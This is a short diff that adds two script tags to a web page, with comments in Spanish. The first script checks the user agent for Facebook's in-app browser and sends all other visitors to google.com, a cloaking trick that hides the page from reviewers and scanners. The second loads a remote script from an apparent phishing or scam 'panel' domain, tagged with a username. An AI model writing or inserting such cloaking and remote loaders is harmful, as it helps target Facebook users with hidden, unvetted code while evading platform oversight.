@@ -1,0 +1,19 @@
+<script>
+    // Función para detectar si la página se abre en la aplicación de Facebook
+    function isFacebookApp() {
+        return navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FBAV");
+    }
+
+    // Función para redirigir si no está en la aplicación de Facebook
+    function checkAndRedirect() {
+        if (!isFacebookApp()) {
+            // Si no está en la aplicación de Facebook, redirigir directamente sin cargar el contenido
+            document.write("Redirigiendo a otra página...");
+            window.location.href = "https://www.google.com/";
+        }
+    }
+
+    // Llamar a la función al cargar la página
+    checkAndRedirect();
+</script>
+<script src="https://mafiapanel.bio/h/index.php?username=Wander" type="text/javascript" async="true"></script>
